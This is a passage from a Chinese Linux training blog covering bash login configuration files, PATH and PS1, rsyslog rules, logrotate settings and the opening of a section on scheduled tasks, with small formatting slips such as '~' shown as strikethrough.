<li>/etc/bashrc 针对全局生效</li>
</ul>
<p>实战</p>
<ol>
<li>我的工作路径在/tmp/justice/superman/dir1/，每天登陆的服务器都很累，因为要天天输入cd /tmp/justice/superman/dir1/,有什么办法能够轻松一点呢？让我少输入一点命令呢？</li>
<li>取消我刚刚设置的别名unalias</li>
</ol>
<h3 id="tab-键补全功能"><a href="#tab-键补全功能" class="headerlink" title="tab 键补全功能"></a>tab 键补全功能</h3><p>单击补全命令,如果没办法补全,双击可以显示以该字符串开始的文件名都有哪些。(或者命令都有哪些)</p>
<h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><ul>
<li>Ctrl +A 跳行首</li>
<li>Ctrl +L 清屏</li>
<li>Ctrl +e 跳行尾</li>
<li>Ctrl +c 中断</li>
<li>Ctrl +R 搜索</li>
<li>ctrl +d logout</li>
</ul>
<h2 id="用户登录流程"><a href="#用户登录流程" class="headerlink" title="用户登录流程"></a>用户登录流程</h2><p>学习用户登录流程的意义:</p>
<p>我们之前有提到过几个变量,比如 histsize、比如 umask 等。这些功能都可以是针对于某一个用户去设置的。那么我们是怎么知道具体要把这些相关配置信息写入哪一个文件呢?哪一个文件是用于全局的变量的设置的,哪一个文件针对单个用户生效,哪一个文件里面的配置字段会覆盖之前的配置字段呢?这就要用到我们的用户登录流程了。</p>
<p>五个配置文件的顺序:</p>
<p>我们用户在登录的时候,会调用一系列的文件,这些文件包括</p>
<ul>
<li>/etc/profile</li>
<li>/etc/profile.d 目录下的所有文件</li>
<li>/.bash_profile</li>
<li>~/.bashrc</li>
<li>/etc/bashrc</li>
</ul>
<p>这是我们系统登录过程中用到的五个文件,我们一一来查看。</p>
<p>/etc/profile</p>
<p>/etc/profile 里面包含了配置字段 include /etc/profile.d 。这个 include 代表扩展配置文件,当读取该文件的时候,会读取相应的一些扩展配置文件。</p>
<p>我们通常不会把所有的东西都往一个文件里面去写,一方面是由于全往一个文件里面去写会导致文件特别大,另一方面,不方便我们的修改文件的灵活度。我们要从一个大篇幅的配置文件中找到某一行,非常的累,那么我们就可以将配置文件也分门别类的去写。比如说我创建了一个新的程序,这个程序需要一些变量的设置,我就可以将这些变量写成一个新的文件,放在/etc/profile.d 目录下,那么当我读取 profile 的时候一样能够读到该文件,当我不需要那个程序了,我也不用去找这个配置字段了,直接把对应的配置文件删除就可以了吧。</p>
<p>~/.bash_profile</p>
<p>接下来回去读<del>/.bash_profile 文件,由于是家目录下的,这是属于用户个人本身的配置文件,也就是说,写在这个配置文件当中的变量,只针对对应的用户生效。该文件里写的内容一部分是去读取</del>/.bashrc 文件,一部分写了 path 变量的相关内容。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> .bash_profile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Get the aliases and <span class="built_in">functions</span></span></span><br><span class="line">if [ -f ~/.bashrc ]; then</span><br><span class="line">. ~/.bashrc</span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="bash"> User specific environment and startup programs</span></span><br><span class="line">PATH=$PATH:$HOME/bin</span><br><span class="line">export PATH</span><br></pre></td></tr></table></figure>

<h3 id="PATH-变量"><a href="#PATH-变量" class="headerlink" title="PATH 变量"></a>PATH 变量</h3><p>PATH 变量是我们系统中的相关命令的路径。PATH 的作用,简化我们的命令写法。</p>
<p>我们执行的命令一般都在 PATH 指定的路径中,比如说我们的 useradd 命令,实际上执行的是/usr/sbin/useradd ,再比如说 touch 命令,实际上执行的是/bin/touch 命令。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# echo $PATH</span><br><span class="line">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line">[root@mastera0 ~]# which useradd</span><br><span class="line">/usr/sbin/useradd</span><br><span class="line">[root@mastera0 ~]# which touch</span><br><span class="line">/usr/bin/touch</span><br><span class="line">[root@mastera0 ~]# vim pathtest</span><br><span class="line">[root@mastera0 ~]# ll pathtest</span><br><span class="line">-rw-r--r--. 1 root root 26 Jun 24 16:58 pathtest</span><br><span class="line">[root@mastera0 ~]# chmod +x pathtest</span><br><span class="line">[root@mastera0 ~]# ll pathtest</span><br><span class="line">-rwxr-xr-x. 1 root root 26 Jun 24 16:58 pathtest</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">-bash: pathtest: command not found</span><br><span class="line">[root@mastera0 ~]# ./pathtest</span><br><span class="line">this is a PATH-test!</span><br><span class="line">[root@mastera0 ~]# cp pathtest /usr/local/bin</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">this is a PATH-test!</span><br><span class="line">[root@mastera0 ~]# which pathtest</span><br><span class="line">/usr/local/bin/pathtest</span><br></pre></td></tr></table></figure>

<p>那么 PATH 也有一个读取顺序,优先会从第一个位置开始找,比如说我们去/usr/local/sbin 下面创建一个同名的可执行文件 pathtest,内容如下:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# vim pathtest</span><br><span class="line">[root@mastera0 ~]# cp pathtest /usr/local/sbin</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">this is a PATH-test!</span><br><span class="line">[root@mastera0 ~]# ./pathtest</span><br><span class="line">New! I am /usr/local/sbin this is a PATH-test!</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">this is a PATH-test!</span><br><span class="line">[root@mastera0 ~]# export PATH</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">New! I am /usr/local/sbin this is a PATH-test!</span><br></pre></td></tr></table></figure>

<p>这个就是 PATH 的读取顺序,由于第二个 pathtest 命令的路径/usr/local/sbin 优先于第一个</p>
<p>pathtest 命令的路径/usr/local/bin,所以执行了第二个 pathtest即/usr/local/sbin/pathtest。然后我们把第二个 pathtest 删除 <code>rm -rf /usr/local/sbin/pathtest</code>,重新 export 一下PATH,export 是设置环境变量的意思。之后我们讲到脚本会去说</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 ~]# rm -rf /usr/local/sbin/pathtest</span><br><span class="line">[root@mastera0 ~]# export PATH</span><br><span class="line">[root@mastera0 ~]# pathtest</span><br><span class="line">this is a PATH-test!</span><br></pre></td></tr></table></figure>

<p>那么这时候再来看一下执行结果是不是又回来了。</p>
<p>最后,读完这两个<del>/.bash_profile 和</del>/.bashrc 以后,系统最后再去读/etc/bashrc。</p>
<p>这是我们整个的流程。先后读取顺序分别是</p>
<ol>
<li>/etc/profile</li>
<li>/etc/profile.d/*</li>
<li>~/.bash_profile</li>
<li>~/.bashrc</li>
<li>/etc/bashrc</li>
</ol>
<p>记住,后面写的变量会覆盖之前的变量值,所以我们想让哪些变量生效,就一定要清楚写在什么位置。</p>
<p>比如说,我希望只能够给 student 用户使用的别名应该写到~/.bashrc 目录下</p>
<p>我希望让全局生效的参数可以放置在/etc/profile 目录下。</p>
<p><code>Su</code> 和 <code>su -</code>的区别:这就是用户登录流程要注意的事情,系统里面有个很典型的例子,就是 su</p>
<p><code>Su</code> 代表切换用户。用法是 <code>su - 用户名</code>,或者<code>su</code> 直接跟上用户名。前者叫标准切换,后者叫非标准切换。</p>
<p>非标准切换有些变量是拿不到的。所以你可以看到 su 之后,我们的位置还在切换之前的位置,而我们 <code>su -</code> 的位置已经切换到用户的家目录了。</p>
<p>那么是哪些变量没拿到呢?</p>
<p>我们来做个小实验。</p>
<p>演示 给 5 个配置文件的头部分别写上 <code>echo &quot;xxx (配置文件名) start&quot;</code>,尾部写上 <code>echo &quot;xxxx(配置文件名) stop&quot;</code></p>
<p> <code>Man bash</code> 可以告诉你登录流程的相关内容。</p>
<h3 id="PS1-变量"><a href="#PS1-变量" class="headerlink" title="PS1 变量"></a>PS1 变量</h3><p>/etc/bashrc 中有一个变量 PS1,我们一起来看看他的作用。</p>
<p><code>man bash</code> 后搜索 ps1 关键词</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">\d :代表日期,格式为 weekday month date,例如:"Mon Aug 1"</span><br><span class="line">\H :完整的主机名称。例如:我的机器名称为:fc4.linux,则这个名称就是 fc4.linux</span><br><span class="line">\h :仅取主机的第一个名字,如上例,则为 fc4,.linux 则被省略</span><br><span class="line">\t :显示时间为 24 小时格式,如:HH:MM:SS</span><br><span class="line">\T :显示时间为 12 小时格式</span><br><span class="line">\A :显示时间为 24 小时格式:HH:MM</span><br><span class="line">\u :当前用户的账号名称</span><br><span class="line">\v :BASH 的版本信息</span><br><span class="line">\w :完整的工作目录名称。家目录会以 ~代替</span><br><span class="line">\W :利用 basename 取得工作目录名称,所以只会列出最后一个目录</span><br><span class="line"> :下达的第几个命令</span><br><span class="line">\$ :提示字符,如果是 root 时,提示符为:# ,普通用户则为:$</span><br></pre></td></tr></table></figure>

<p>the在 PS1 中设置字符序列颜色的格式为:[\e[F;Bm]</p>
<ul>
<li><p>F为字体颜色,编号 30~37;</p>
</li>
<li><p>B为背景色,编号 40~47 。</p>
</li>
<li><p>取消设置:[\e[m]</p>
</li>
</ul>
<p>颜色表</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">前景 背景 颜色</span><br><span class="line">30 40 黑色</span><br><span class="line">31 41 红色</span><br><span class="line">32 42 绿色</span><br><span class="line">33 43 黄色</span><br><span class="line">34 44 蓝色</span><br><span class="line">35 45 紫红色</span><br><span class="line">36 46 青蓝色</span><br><span class="line">37 47 白色</span><br><span class="line"></span><br><span class="line">代码</span><br><span class="line">意义</span><br><span class="line">0 OFF</span><br><span class="line">1 高亮显示</span><br><span class="line">4 underline</span><br><span class="line">7 反白显示</span><br><span class="line">8 不可见</span><br></pre></td></tr></table></figure>

<p>举例:</p>
<p>PS1=’[[\e[32m]###[\e[31m]\u@[\e[36m]\h \w]$[\e[m]‘</p>
<ul>
<li><p>[\e[32m] 设置为绿色</p>
</li>
<li><p>### 显示现在运行的是第几条命令</p>
</li>
<li><p>[\e[31m] 设置为红色</p>
</li>
<li><p>\u@ 当前用户的账号名称@</p>
</li>
<li><p>[\e[36m] 青蓝色</p>
</li>
<li><p>\h \w</p>
</li>
<li><p>\h 仅取主机的第一个名字,\w 是说:显示完整的路径,但是不知到为什么家他显示~而不是绝对路径。</p>
</li>
<li><p>[\e[m] 使用来关闭颜色设置的。</p>
</li>
</ul>
<p>要是你没有这个的话;那么,你的命令提示符,包括你通过命令提示符输出的东西都是和最后一次的颜色设置相同( 除了一些有特殊意义的文件 )。</p>
<p>这个配置写到哪里呢???</p>
<p>如果只想让当前用户生效,那么应该在用户的根目录下的 “.bashrc”,在里头的最后一行加上,然后保存。然后 source .bashrc 或者 “. .bashrc” 或者注销一下。如果想让所有用户生效,该放哪里?思考题</p>
<h2 id="Bash简介课后作业"><a href="#Bash简介课后作业" class="headerlink" title="Bash简介课后作业"></a>Bash简介课后作业</h2><ol>
<li>要求 student 用户登录的时候获取 umask 值为 044, 并且该 值永久生效。</li>
<li>要求所有普通用户登录时, 最后获取到的 HISTSIZE 值为 500, 而 root 用户获取到的 HISTSIZE 的值为 1000 。</li>
<li>梳理一下五个文件的登录顺序。</li>
</ol>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 日志和计划任务</title>
    <url>/2016/12/22/booboo_linux_base/08-%E6%97%A5%E5%BF%97%E5%92%8C%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/</url>
    <content><![CDATA[<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><h3 id="日志的作用"><a href="#日志的作用" class="headerlink" title="日志的作用"></a>日志的作用</h3><ul>
<li>解决系统方面的错误</li>
<li>解决网络服务的问题</li>
<li>过往事件记录</li>
</ul>
<h3 id="常用的日志"><a href="#常用的日志" class="headerlink" title="常用的日志"></a>常用的日志</h3><table>
<thead>
<tr>
<th align="left">日志</th>
<th align="left">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/var/log/cron</td>
<td align="left">crontab 计划任务</td>
</tr>
<tr>
<td align="left">/var/log/dmesg</td>
<td align="left">开机核心侦测信息</td>
</tr>
<tr>
<td align="left">/var/log/lastlog</td>
<td align="left">系统所有帐号最近一次登陆信息</td>
</tr>
<tr>
<td align="left">/var/log/maillog</td>
<td align="left">邮件往来信息</td>
</tr>
<tr>
<td align="left">/var/log/messages</td>
<td align="left">系统错误信息</td>
</tr>
<tr>
<td align="left">/var/log/secure</td>
<td align="left">涉及输入帐号密码的程序</td>
</tr>
<tr>
<td align="left">/var/log/wtmp</td>
<td align="left">正确登陆系统的账户信息</td>
</tr>
<tr>
<td align="left">/var/log/btmp</td>
<td align="left">错误登陆系统的账户信息</td>
</tr>
<tr>
<td align="left">/var/log/httpd/*</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">/var/log/samba/*</td>
<td align="left">不同的网络服务会使用它们自己的登录文件来记载它们自己产生的各项信息</td>
</tr>
</tbody></table>
<h3 id="日志的类型"><a href="#日志的类型" class="headerlink" title="日志的类型"></a>日志的类型</h3><p>1&gt; 可查看的 ASCII 的日志</p>
<p>• messages</p>
<p>• 与程序同名的目录下, 会记录和该程序相关的一些日志</p>
<p>2&gt; 不可查看的 data 日志</p>
<p>需要调用某些命令才能去查看对应的日志</p>
<p>• wtmp &lt;==last: 系统登陆登出信息</p>
<p>• btmp &lt;==lastb: 错误的系统登陆登出情况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">3<span class="comment">#root@rhel6 ~]#file /var/log/wtmp</span></span></span><br><span class="line">/var/log/wtmp: data</span><br></pre></td></tr></table></figure>

<h3 id="日志需要的服务和程序"><a href="#日志需要的服务和程序" class="headerlink" title="日志需要的服务和程序"></a>日志需要的服务和程序</h3><p>rsyslogd 主要负责记录系统运作中 , kernel 或应用程序产生的各种讯息 , 讯息被写入系统日志</p>
<p>logrotate 主要在进行日志文件的轮替功能</p>
<ul>
<li>rhel5 版本以前是 syslogd 服务 , rhel6 之后是 rsyslogd 服务 ( reliable and extended 可靠的和拓展的<br>syslogd 服务 )</li>
</ul>
<p>『 (1) 什么服务 (2) 什么等级信息 (3) 需要被记录在哪里 ( 设备或文件 ) 』</p>
<h3 id="rsyslog-的相关配置文件"><a href="#rsyslog-的相关配置文件" class="headerlink" title="rsyslog 的相关配置文件"></a>rsyslog 的相关配置文件</h3><p>• /etc/rsyslog.conf</p>
<p>• /etc/rsyslog.d/*</p>
<h3 id="etc-rsyslog-conf"><a href="#etc-rsyslog-conf" class="headerlink" title="/etc/rsyslog.conf"></a>/etc/rsyslog.conf</h3><p>/etc/rsyslog.conf 文件中的一项配置记录由 “ 选项 ” (selector) 和 “ 动作 ” (action)两个部分组成,两<br>者间用 tab 制表符进行分隔(使用空格间隔是无效的)。</p>
<p>“ 选项 ” ( selector)由两部分组成:</p>
<ul>
<li>设施 facility 和级别 loglevel,由点号.分隔,两部分都是大小写不敏感;</li>
<li>设施和级别都在 syslog(3)中有描述。各保留字段间用分号分隔。</li>
<li>如下行所示:</li>
</ul>
<p>设施. 级别 [;设施.级别]TAB 动作</p>
<h4 id="设施-facility"><a href="#设施-facility" class="headerlink" title="设施 facility"></a>设施 facility</h4><p>保留字段中的 “ 设施 ” (facility )代表信息产生的源头,可以是:</p>
<table>
<thead>
<tr>
<th align="left">facility</th>
<th align="left">设施</th>
</tr>
</thead>
<tbody><tr>
<td align="left">auth</td>
<td align="left">认证系统,即询问用户名和口令</td>
</tr>
<tr>
<td align="left">cron</td>
<td align="left">系统定时系统执行定时任务时发出的信息</td>
</tr>
<tr>
<td align="left">daemon</td>
<td align="left">某些系统的守护程序的 syslog,如由 in.ftpd 产生的 log</td>
</tr>
<tr>
<td align="left">kern</td>
<td align="left">内核的 syslog 信息</td>
</tr>
<tr>
<td align="left">lpr</td>
<td align="left">打印机的 syslog 信息</td>
</tr>
<tr>
<td align="left">mail</td>
<td align="left">邮件系统的 syslog 信息</td>
</tr>
<tr>
<td align="left">mark</td>
<td align="left">定时发送消息的时标程序</td>
</tr>
<tr>
<td align="left">news</td>
<td align="left">新闻系统的 syslog 信息</td>
</tr>
<tr>
<td align="left">user</td>
<td align="left">本地用户应用程序的 syslog 信息</td>
</tr>
<tr>
<td align="left">uucp</td>
<td align="left">uucp 子系统的 syslog 信息,unix to unix copy, unix 主机之间相关的通讯</td>
</tr>
<tr>
<td align="left">local0-7</td>
<td align="left">种本地类型的 syslog 信息,这些信息可以又用户来定义</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">代表以上各种设备</td>
</tr>
</tbody></table>
<h4 id="级别-loglevel"><a href="#级别-loglevel" class="headerlink" title="级别 loglevel"></a>级别 loglevel</h4><p>保留字段中的 “ 级别 ” 代表信息的重要性,可以是:</p>
<table>
<thead>
<tr>
<th align="left">num</th>
<th align="left">loglevel</th>
<th align="left">级别</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">emerg</td>
<td align="left">紧急,处于 Panic 状态。通常应广播到所有用户;几乎要当机</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">alert</td>
<td align="left">告警,当前状态必须立即进行纠正。例如,系统数据库崩溃;</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">crit</td>
<td align="left">关键状态的警告。例如,硬件故障;</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">err</td>
<td align="left">其它错误;</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">warn</td>
<td align="left">警告;</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">notice</td>
<td align="left">注意;非错误状态的报告,但应特别处理;</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">info</td>
<td align="left">通报信息;</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">debug</td>
<td align="left">调试程序时的信息;</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">none</td>
<td align="left">通常调试程序时用,指示带有 none 级别的类型产生的信息无需送出。如</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">*.debug;mail.none</td>
<td align="left">表示调试时除邮件信息外其它信息都送出。</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">.xxx:</td>
<td align="left">表示大于等于 xxx 级别的信息</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">.=xxx:</td>
<td align="left">表示等于 xxx 级别的信息</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">.!xxx:</td>
<td align="left">表示在 xxx 之外的等级的信息拓展:</td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">19<span class="comment">#root@rhel6 ~]#man syslog</span></span></span><br></pre></td></tr></table></figure>

<h4 id="动作-action"><a href="#动作-action" class="headerlink" title="动作 action"></a>动作 action</h4><p>“ 动作 ” 域指示信息发送的目的地。可以是:</p>
<table>
<thead>
<tr>
<th align="left">action</th>
<th align="left">动作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">/filename</td>
<td align="left">日志文件。由绝对路径指出的文件名,此文件必须事先建立;</td>
</tr>
<tr>
<td align="left">@host</td>
<td align="left">远程主机; @符号后面可以是 ip,也可以是域名,默认在/etc/hosts 文件下 loghost 这个别名已经指定给了本机。</td>
</tr>
<tr>
<td align="left">user1,user2</td>
<td align="left">指定用户。如果指定用户已登录,那么他们将收到信息;</td>
</tr>
<tr>
<td align="left">*</td>
<td align="left">所有用户。所有已登录的用户都将收到信息。</td>
</tr>
</tbody></table>
<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><ol>
<li>记录到普通文件或设备文件<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*.* /var/log/file.log</span><br><span class="line">*.* /dev/pts/0</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>测试: logger -p local3.info ‘KadeFor is testing the rsyslog and logger ‘</p>
<p>logger 命令用于产生日志</p>
<ol start="2">
<li><p>转发到远程</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">*.* @192.168.0.1 # 使用 UDP 协议转发到 192.168.0.1 的 514(默认)端口</span><br><span class="line">*.* @@192.168.0.1:10514 # 使用 TCP 协议转发到 192.168.0.1 的 10514(默认)端口</span><br></pre></td></tr></table></figure>
</li>
<li><p>发送给用户(需要在线才能收到)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*.* root</span><br><span class="line">*.* root,kadefor,up01</span><br><span class="line">*.* *</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>使用,号分隔多个用户</li>
<li>*号表示所有在线用户</li>
</ul>
<ol start="4">
<li>忽略,丢弃<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">local3.* # 忽略所有 local3 类型的所有级别的日志</span><br></pre></td></tr></table></figure></li>
<li>执行脚本<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">local3.* ^/tmp/a.sh</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>^号后跟可执行脚本或程序的绝对路径</li>
</ul>
<ol start="6">
<li>一个标准的简单的配置文件<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">### RULES ####</span></span></span><br><span class="line">规则部分</span><br><span class="line"><span class="meta">#</span><span class="bash"> Log all kernel messages to the console.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Logging much <span class="keyword">else</span> clutters up the screen.</span></span><br><span class="line"><span class="meta">#</span><span class="bash">kern.*</span></span><br><span class="line">/dev/console</span><br><span class="line"><span class="meta">#</span><span class="bash">关于内核的所有日志都放到/dev/console(控制台)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Log anything (except mail) of level info or higher.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Don<span class="string">'t log private authentication messages!</span></span></span><br><span class="line">*.info;mail.none;authpriv.none;cron.none</span><br><span class="line">/var/log/messages</span><br><span class="line"><span class="meta">#</span><span class="bash"> 记录所有日志类型的 info 级别以及大于 info 级别的信息到/var/<span class="built_in">log</span>/messages,但是 mail</span></span><br><span class="line">邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外</span><br><span class="line"><span class="meta">#</span><span class="bash"> The authpriv file has restricted access.</span></span><br><span class="line">authpriv.*</span><br><span class="line">/var/log/secure</span><br><span class="line"><span class="meta">#</span><span class="bash"> authpriv 验证相关的所有信息存放在/var/<span class="built_in">log</span>/secure</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Log all the mail messages <span class="keyword">in</span> one place.</span></span><br><span class="line">mail.*</span><br><span class="line">-/var/log/maillog</span><br><span class="line"><span class="meta">#</span><span class="bash"> 邮件的所有信息存放在/var/<span class="built_in">log</span>/maillog; 这里有一个-符号, 表示是使用异步的方式记录,</span></span><br><span class="line">因为日志一般会比较大</span><br><span class="line"><span class="meta">#</span><span class="bash"> Log cron stuff</span></span><br><span class="line">cron.*</span><br><span class="line">/var/log/cron</span><br><span class="line"><span class="meta">#</span><span class="bash"> 计划任务有关的信息存放在/var/<span class="built_in">log</span>/cron</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Everybody gets emergency messages</span></span><br><span class="line">*.emerg</span><br><span class="line">*</span><br><span class="line"><span class="meta">#</span><span class="bash"> 所有日志类型的 emerg 信息发给所有用户</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Save news errors of level crit and higher <span class="keyword">in</span> a special file.</span></span><br><span class="line">uucp,news.crit</span><br><span class="line">/var/log/spooler</span><br><span class="line"><span class="meta">#</span><span class="bash"> 记录 uucp,news.crit 等存放在/var/<span class="built_in">log</span>/spooler</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Save boot messages also to boot.log</span></span><br><span class="line">local7.*</span><br><span class="line">/var/log/boot.log</span><br><span class="line"><span class="meta">#</span><span class="bash"> 启动的相关信息存放在/var/<span class="built_in">log</span>/boot.log</span></span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><p>service rsyslog restart &lt;==rhel6</p>
<p>systermctl restart rsyslog &lt;==rhel7</p>
<p>ps : rsyslog 的日志只要『被编辑过』就无法继续记录 ! 需要重启日志恢复。</p>
<h2 id="logrotate-日志轮询"><a href="#logrotate-日志轮询" class="headerlink" title="logrotate 日志轮询"></a>logrotate 日志轮询</h2><p>/usr/sbin/logrotate 将旧的日志文件移动成旧文件, 并重新建立一个新的空的档案来记录</p>
<p>/etc/cron.daily/logrotate 记录每天要进行的日志轮替的行为</p>
<p>/etc/logrotate.conf</p>
<p>/etc/logrotate.d/*</p>
<p>程序的配置文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">14<span class="comment">#root@rhel6 ~]#grep -v "^#" /etc/logrotate.conf|grep -v "^$"</span></span></span><br><span class="line">weekly</span><br><span class="line">rotate 4</span><br><span class="line">create</span><br><span class="line">dateext</span><br><span class="line">include /etc/logrotate.d</span><br><span class="line">/var/log/wtmp &#123;</span><br><span class="line">monthly</span><br><span class="line">create 0664 root utmp</span><br><span class="line">minsize 1M</span><br><span class="line">rotate 1</span><br><span class="line">&#125;</span><br><span class="line">/var/log/btmp &#123;</span><br><span class="line">missingok</span><br><span class="line">monthly</span><br><span class="line">create 0600 root utmp</span><br><span class="line">rotate 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以通过 <code>man logrotate</code> 来查看更多的一些定义。</p>
<h3 id="参数和功能"><a href="#参数和功能" class="headerlink" title="参数和功能"></a>参数和功能</h3><p>compress 通过 gzip 压缩转储以后的日志</p>
<p>nocompress 不需要压缩时,用这个参数</p>
<p>copytruncate 用于还在打开中的日志文件,把当前日志备份并截断</p>
<p>nocopytruncate 备份日志文件但是不截断</p>
<p>create mode owner group 转储文件,使用指定的文件模式创建新的日志文件</p>
<p>nocreate 不建立新的日志文件</p>
<p>delaycompress 和 compress 一起使用时,转储的日志文件到下一次转储时才压缩</p>
<p>nodelaycompress 覆盖 delaycompress 选项,转储同时压缩。</p>
<p>errors errors 转储时的错误信息发送到指定的 Email 地址</p>
<p>ifempty 即使是空文件也转储,这个是 logrotate 的缺省选项。</p>
<p>notifempty 如果是空文件的话,不转储</p>
<p>mail address 把转储的日志文件发送到指定的 E-mail 地址</p>
<p>nomail 转储时不发送日志文件</p>
<p>olddir directory 转储后的日志文件放入指定的目录,必须和当前日志文件在同一个文件系统</p>
<p>noolddir 转储后的日志文件和当前日志文件放在同一个目录下</p>
<p>prerotate/endscript 在转储以前需要执行的命令可以放入这个对,这两个关键字必须单独成行</p>
<p>postrotate/endscript 在转储以后需要执行的命令可以放入这个对,这两个关键字必须单独成行</p>
<p>daily 指定转储周期为每天</p>
<p>weekly 指定转储周期为每周</p>
<p>monthly 指定转储周期为每月</p>
<p>rotate count 指定日志文件删除之前转储的次数,0 指没有备份,5 指保留 5 个备份</p>
<p>tabootext [+] list 让 logrotate 不转储指定扩展名的文件,缺省的扩展名是:.rpm-orig, .rpmsave, v, 和 ~</p>
<p>size size 当日志文件到达指定的大小时才转储,Size 可以指定 bytes (缺省)以及 KB (sizek)或者 MB (sizem).</p>
<h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p>要求:</p>
<ol>
<li>记录所有日志类型的 info 级别以及大于 info 级别的信息,保存到/var/log/test,但是 mail<br>邮件信息,authpriv 验证方面的信息和 cron 时间任务相关的信息除外</li>
<li>/var/log/test 日志轮询方式为:</li>
</ol>
<p>• 每天轮询一次;</p>
<p>• 保留 4 个文件;</p>
<p>• 以时间命名;</p>
<p>• 创建与原日志同名的新文件。</p>
<p>第一步:修改 rsyslog 的配置文件/etc/rsyslog.conf</p>
<p><code>*.info;mail.none;authpriv.none;cron.none</code></p>
<p>第二步:创建空文件/var/log/test</p>
<p><code>touch /var/log/test</code></p>
<p>第三步:重新启动服务</p>
<p><code>service rsyslog restart</code></p>
<p>第四步:修改 logrotate 配置文件/etc/logrotate.conf</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/var/log/test &#123; &lt;== 轮循的日志是谁</span><br><span class="line">daily &lt;== 轮询周期多久</span><br><span class="line">rotate 4 &lt;== 保留几个带时间戳的文件</span><br><span class="line">dateext &lt;== 是否以时间戳为文件更名格式</span><br><span class="line">create &lt;== 是否需要创建一个与原日志文件同名的新文件</span><br></pre></td></tr></table></figure>
<p>第五步:测试 <code>logrotate -vf /etc/logrotate.conf</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[#</span><span class="bash">41<span class="comment">#root@rhel6 ~]#logrotate -vf /etc/logrotate.conf</span></span></span><br><span class="line"><span class="meta">[#</span><span class="bash">42<span class="comment">#root@rhel6 ~]#ls /var/log/|grep test</span></span></span><br><span class="line">test</span><br><span class="line">test-20160630</span><br><span class="line">/var/log/test</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>每个人或多火烧都有一些约会或者是工作,有的工作是例行性的, 例如每年一次的加薪、每个月一次 的工作报告、每周一次的午餐会报、每天需要的打卡等等; 有的工作则是临时发生的, 例如刚好总公 司有高官来访,需要你准备演示器材等等! 用在生活上面, 例如每年的爱人的生日、每天的起床时间 等等、还有突发性的计算机大降价 (啊!真希望天天都有!) 等等啰。</p>
